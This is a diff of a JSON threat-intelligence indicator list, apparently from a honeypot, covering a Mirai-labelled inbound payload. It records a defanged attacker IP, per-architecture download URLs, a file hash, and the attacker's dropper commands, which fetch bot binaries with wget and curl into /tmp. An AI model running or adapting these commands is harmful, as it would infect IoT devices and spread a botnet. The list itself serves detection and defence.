@@ -1,21 +1,39 @@
 [
   {
-    "context": "Embedded IP in inbound payload",
-    "source": "static_analysis",
-    "type": "ip",
-    "value": "41.216.189.XXX"
+    "context": "Embedded URL in inbound payload",
+    "source": "strings",
+    "type": "url",
+    "value": "hxxp://41.216.189.XXX/nz/nz.arm7;"
   },
   {
     "context": "Embedded URL in inbound payload",
     "source": "strings",
     "type": "url",
-    "value": "hxxp://41.216.189.XXX/nz/nz.arc;"
+    "value": "hxxp://41.216.189.XXX/nz/nz.i686;"
   },
   {
     "context": "Embedded URL in inbound payload",
     "source": "strings",
     "type": "url",
-    "value": "hxxp://41.216.189.XXX/nz/nz.arm;"
+    "value": "hxxp://41.216.189.XXX/nz/nz.i468;"
+  },
+  {
+    "context": "Embedded URL in inbound payload",
+    "source": "strings",
+    "type": "url",
+    "value": "hxxp://41.216.189.XXX/nz/nz.spc;"
+  },
+  {
+    "context": "Embedded URL in inbound payload",
+    "source": "strings",
+    "type": "url",
+    "value": "hxxp://41.216.189.XXX/nz/nz.x86;"
+  },
+  {
+    "context": "Embedded URL in inbound payload",
+    "source": "strings",
+    "type": "url",
+    "value": "hxxp://41.216.189.XXX/nz/nz.x86_64;"
   },
   {
     "context": "Embedded URL in inbound payload",
@@ -33,43 +51,7 @@
     "context": "Embedded URL in inbound payload",
     "source": "strings",
     "type": "url",
-    "value": "hxxp://41.216.189.XXX/nz/nz.arm7;"
-  },
-  {
-    "context": "Embedded URL in inbound payload",
-    "source": "strings",
-    "type": "url",
-    "value": "hxxp://41.216.189.XXX/nz/nz.i468;"
-  },
-  {
-    "context": "Embedded URL in inbound payload",
-    "source": "strings",
-    "type": "url",
-    "value": "hxxp://41.216.189.XXX/nz/nz.i686;"
-  },
-  {
-    "context": "Embedded URL in inbound payload",
-    "source": "strings",
-    "type": "url",
     "value": "hxxp://41.216.189.XXX/nz/nz.m68k;"
-  },
-  {
-    "context": "Embedded URL in inbound payload",
-    "source": "strings",
-    "type": "url",
-    "value": "hxxp://41.216.189.XXX/nz/nz.mips;"
-  },
-  {
-    "context": "Embedded URL in inbound payload",
-    "source": "strings",
-    "type": "url",
-    "value": "hxxp://41.216.189.XXX/nz/nz.mpsl;"
-  },
-  {
-    "context": "Embedded URL in inbound payload",
-    "source": "strings",
-    "type": "url",
-    "value": "hxxp://41.216.189.XXX/nz/nz.ppc;"
   },
   {
     "context": "Embedded URL in inbound payload",
@@ -81,31 +63,85 @@
     "context": "Embedded URL in inbound payload",
     "source": "strings",
     "type": "url",
-    "value": "hxxp://41.216.189.XXX/nz/nz.spc;"
+    "value": "hxxp://41.216.189.XXX/nz/nz.mpsl;"
   },
   {
     "context": "Embedded URL in inbound payload",
     "source": "strings",
     "type": "url",
-    "value": "hxxp://41.216.189.XXX/nz/nz.x86_64;"
+    "value": "hxxp://41.216.189.XXX/nz/nz.arm;"
   },
   {
     "context": "Embedded URL in inbound payload",
     "source": "strings",
     "type": "url",
-    "value": "hxxp://41.216.189.XXX/nz/nz.x86;"
+    "value": "hxxp://41.216.189.XXX/nz/nz.ppc;"
   },
   {
-    "context": "Inbound payload hash (mirai)",
+    "context": "Embedded URL in inbound payload",
+    "source": "strings",
+    "type": "url",
+    "value": "hxxp://41.216.189.XXX/nz/nz.arc;"
+  },
+  {
+    "context": "Embedded URL in inbound payload",
+    "source": "strings",
+    "type": "url",
+    "value": "hxxp://41.216.189.XXX/nz/nz.mips;"
+  },
+  {
+    "context": "Embedded IP in inbound payload",
     "source": "static_analysis",
-    "type": "hash",
-    "value": "bb71242dca49d22b76648b365dac5796346ada57c387f349641f606d9633ae5c"
+    "type": "ip",
+    "value": "41.216.189.XXX"
+  },
+  {
+    "context": "Suspicious command in inbound payload",
+    "source": "strings",
+    "type": "command",
+    "value": "cp /bin/busybox /tmp/"
+  },
+  {
+    "context": "Suspicious command in inbound payload",
+    "source": "strings",
+    "type": "command",
+    "value": "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget hxxp://41.216.189.XXX/nz/nz.x86; curl -O hxxp://41.216.189.XXX"
+  },
+  {
+    "context": "Suspicious command in inbound payload",
+    "source": "strings",
+    "type": "command",
+    "value": "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget hxxp://41.216.189.XXX/nz/nz.mips; curl -O hxxp://41[.]216[.]189[.]"
   },
   {
     "context": "Suspicious command in inbound payload",
     "source": "strings",
     "type": "command",
     "value": "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget hxxp://41.216.189.XXX/nz/nz.arc; curl -O hxxp://41.216.189.XXX"
+  },
+  {
+    "context": "Suspicious command in inbound payload",
+    "source": "strings",
+    "type": "command",
+    "value": "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget hxxp://41.216.189.XXX/nz/nz.i468; curl -O hxxp://41[.]216[.]189[.]"
+  },
+  {
+    "context": "Suspicious command in inbound payload",
+    "source": "strings",
+    "type": "command",
+    "value": "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget hxxp://41.216.189.XXX/nz/nz.i686; curl -O hxxp://41[.]216[.]189[.]"
+  },
+  {
+    "context": "Suspicious command in inbound payload",
+    "source": "strings",
+    "type": "command",
+    "value": "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget hxxp://41.216.189.XXX/nz/nz.x86_64; curl -O hxxp://41[.]216[.]18"
+  },
+  {
+    "context": "Suspicious command in inbound payload",
+    "source": "strings",
+    "type": "command",
+    "value": "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget hxxp://41.216.189.XXX/nz/nz.mpsl; curl -O hxxp://41[.]216[.]189[.]"
   },
   {
     "context": "Suspicious command in inbound payload",
@@ -135,49 +171,7 @@
     "context": "Suspicious command in inbound payload",
     "source": "strings",
     "type": "command",
-    "value": "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget hxxp://41.216.189.XXX/nz/nz.i468; curl -O hxxp://41[.]216[.]189[.]"
-  },
-  {
-    "context": "Suspicious command in inbound payload",
-    "source": "strings",
-    "type": "command",
-    "value": "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget hxxp://41.216.189.XXX/nz/nz.i686; curl -O hxxp://"
-  },
-  {
-    "context": "Suspicious command in inbound payload",
-    "source": "strings",
-    "type": "command",
-    "value": "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget hxxp://41.216.189.XXX/nz/nz.i686; curl -O hxxp://41[.]216[.]189[.]"
-  },
-  {
-    "context": "Suspicious command in inbound payload",
-    "source": "strings",
-    "type": "command",
-    "value": "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget hxxp://41.216.189.XXX/nz/nz.m68k; curl -O hxxp://41[.]216[.]189[.]"
-  },
-  {
-    "context": "Suspicious command in inbound payload",
-    "source": "strings",
-    "type": "command",
-    "value": "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget hxxp://41.216.189.XXX/nz/nz.mips; curl -O hxxp://41[.]216[.]189[.]"
-  },
-  {
-    "context": "Suspicious command in inbound payload",
-    "source": "strings",
-    "type": "command",
-    "value": "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget hxxp://41.216.189.XXX/nz/nz.mpsl; curl -O hxxp://41[.]216[.]189[.]"
-  },
-  {
-    "context": "Suspicious command in inbound payload",
-    "source": "strings",
-    "type": "command",
     "value": "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget hxxp://41.216.189.XXX/nz/nz.ppc; curl -O hxxp://41.216.189.XXX"
-  },
-  {
-    "context": "Suspicious command in inbound payload",
-    "source": "strings",
-    "type": "command",
-    "value": "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget hxxp://41.216.189.XXX/nz/nz.sh4; curl -O hxxp://41.216.189.XXX"
   },
   {
     "context": "Suspicious command in inbound payload",
@@ -189,18 +183,24 @@
     "context": "Suspicious command in inbound payload",
     "source": "strings",
     "type": "command",
-    "value": "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget hxxp://41.216.189.XXX/nz/nz.x86_64; curl -O hxxp://41[.]216[.]18"
+    "value": "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget hxxp://41.216.189.XXX/nz/nz.m68k; curl -O hxxp://41[.]216[.]189[.]"
   },
   {
     "context": "Suspicious command in inbound payload",
     "source": "strings",
     "type": "command",
-    "value": "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget hxxp://41.216.189.XXX/nz/nz.x86; curl -O hxxp://41.216.189.XXX"
+    "value": "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget hxxp://41.216.189.XXX/nz/nz.sh4; curl -O hxxp://41.216.189.XXX"
   },
   {
     "context": "Suspicious command in inbound payload",
     "source": "strings",
     "type": "command",
-    "value": "cp /bin/busybox /tmp/"
+    "value": "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget hxxp://41.216.189.XXX/nz/nz.i686; curl -O hxxp://"
+  },
+  {
+    "context": "Inbound payload hash (mirai)",
+    "source": "static_analysis",
+    "type": "hash",
+    "value": "bb71242dca49d22b76648b365dac5796346ada57c387f349641f606d9633ae5c"
   }
 ]
